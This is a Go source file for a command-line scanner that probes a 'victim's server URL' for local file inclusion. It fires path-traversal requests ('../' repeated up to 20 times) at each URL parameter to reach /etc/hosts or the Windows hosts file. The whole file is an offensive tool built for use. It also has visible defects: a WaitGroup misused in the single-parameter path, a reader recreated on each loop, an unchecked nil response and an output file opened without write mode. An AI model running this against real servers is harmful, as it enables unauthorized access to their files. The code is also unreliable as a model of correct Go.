package cli

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
)

const (
	Check   = "check"
	Unix    = "unix"
	Windows = "windows"
)

type CheckLfiCommand struct {
	ParamFile    *os.File
	ParamName    string
	OutputWriter io.Writer

	OS string

	Url string
}

func NewCheckLfiCommand() (CheckLfiCommand, error) {
	paramFile := flag.String("P", "", "param list to Check")
	paramName := flag.String("p", "", "param name to Check")

	outputFile := flag.String("o", "", "output file name to save results to")
	system := flag.String("s", "", "OS of the victim server")

	url := flag.String("u", "", "victim's server URL")

	flag.Parse()
	if *paramName != "" && *paramFile != "" {
		return CheckLfiCommand{}, errors.New("incompatible flags: -p and -P")
	}
	if *paramName == "" && *paramFile == "" {
		return CheckLfiCommand{}, errors.New("must specify URL params to Check: -p or -P")
	}
	if *url == "" {
		return CheckLfiCommand{}, errors.New("must specify target URL with -u")
	}
	if *system == "" || (*system != Unix && *system != Windows) {
		return CheckLfiCommand{}, errors.New("must specify correct OS with -s")
	}

	var outputWriter io.Writer
	var err error
	if *outputFile != "" {
		outputWriter, err = os.OpenFile(*outputFile, os.O_APPEND, os.ModeAppend)
		if err != nil {
			return CheckLfiCommand{}, errors.New(fmt.Sprintf("error specifying output file with -o: %s", err))
		}
	} else {
		outputWriter = os.Stdout
	}

	var paramListFile *os.File
	if *paramFile != "" {
		paramListFile, err = os.Open(*paramFile)
		if err != nil {
			return CheckLfiCommand{}, errors.New(fmt.Sprintf("error opening wordlist: %s", err))
		}
	}

	return CheckLfiCommand{
		ParamFile:    paramListFile,
		ParamName:    *paramName,
		OutputWriter: outputWriter,
		OS:           *system,
		Url:          *url,
	}, nil

}

func (c *CheckLfiCommand) CheckLFI() {
	var filename string
	if c.OS == Unix {
		filename = "/etc/hosts"
	} else {
		filename = "windows\\system32\\drivers\\etc\\hosts"
	}

	wg := sync.WaitGroup{}
	check := func(param string) {
		defer wg.Done()
		pathBuilder := strings.Builder{}
		pathBuilder.WriteString("../")
		for i := 0; i < 20; i++ {
			url := fmt.Sprintf("%s?%s=%s%s", c.Url, param, pathBuilder.String(), filename)
			fmt.Fprintf(c.OutputWriter, "CHECKING %s", url)
			resp, _ := http.Get(url)
			if resp.StatusCode == http.StatusOK {
				fmt.Fprintf(c.OutputWriter, "!!! LFI DETECTED WITH %s", url)
				return
			}
			pathBuilder.WriteString("../")
		}
	}

	if c.ParamFile == nil {
		check(c.ParamName)
	} else {
		for {
			reader := bufio.NewReader(c.ParamFile)
			param, err := reader.ReadString('\n')
			if err != nil && errors.Is(err, io.EOF) {
				return
			} else if err != nil {
				panic(fmt.Sprintf("error reading params file! %s", err))
			}
			wg.Add(1)
			go check(param)
		}
	}
	wg.Wait()

}
